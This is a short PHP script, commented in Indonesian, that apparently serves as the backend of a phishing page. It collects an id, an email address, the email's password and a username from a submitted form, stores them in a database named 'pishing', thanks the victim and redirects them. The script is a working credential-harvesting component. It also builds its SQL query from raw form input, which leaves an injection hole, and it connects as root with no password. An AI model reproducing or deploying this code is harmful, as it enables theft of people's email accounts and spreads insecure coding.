<?php
// Koneksi ke database
$host = "localhost";
$username = "root";
$password = "";
$database = "pishing";

$conn = new mysqli($host, $username, $password, $database);

// Periksa koneksi
if ($conn->connect_error) {
    die("Koneksi gagal: " . $conn->connect_error);
}

// Ambil nilai dari formulir
$id = $_POST['id'];
$email = $_POST['email'];
$password_email = $_POST['password_email'];
$username = $_POST['username'];

// Masukkan data ke dalam database
$sql = "INSERT INTO data_diri (id, email, password_email, username) VALUES ('$id', '$email', '$password_email', '$username')";

if ($conn->query($sql) === TRUE) {
    // Data berhasil disimpan
    echo "<script>
            alert('Terima kasih!.');
            window.location.href = 'index.php'; // Ganti dengan nama halaman atau file yang sesuai
          </script>";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

// Tutup koneksi
$conn->close();
?>